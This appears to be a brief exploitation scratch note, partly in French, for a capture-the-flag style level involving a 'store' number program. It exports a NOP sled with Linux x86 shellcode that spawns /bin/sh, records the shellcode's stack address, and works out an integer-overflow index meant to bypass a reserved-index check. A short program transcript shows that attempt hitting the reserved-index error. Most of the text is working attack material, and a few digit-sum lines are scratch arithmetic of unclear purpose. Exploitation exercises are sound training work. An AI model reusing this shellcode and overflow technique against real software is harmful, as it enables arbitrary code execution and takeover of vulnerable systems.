``` Shell
export SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
```

On overwrite avec `fgets` dans le `main`

Address of a shellcode : `0xffffd880`
4294957184

Complement's 2
-404
18446744073709551212
18446744073709551212 / 4 = 4611686018427387803

4611686018427387803
-4611686018427387803

4+6+1+1+6+8+6+0+1+8+4+2+7+3+8+7+8+0+3 =  83
8 + 3 = 11
1 + 1 = 2

```
Input command: store
 Number: 4294957184
 Index: -4611686018427387803
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 ```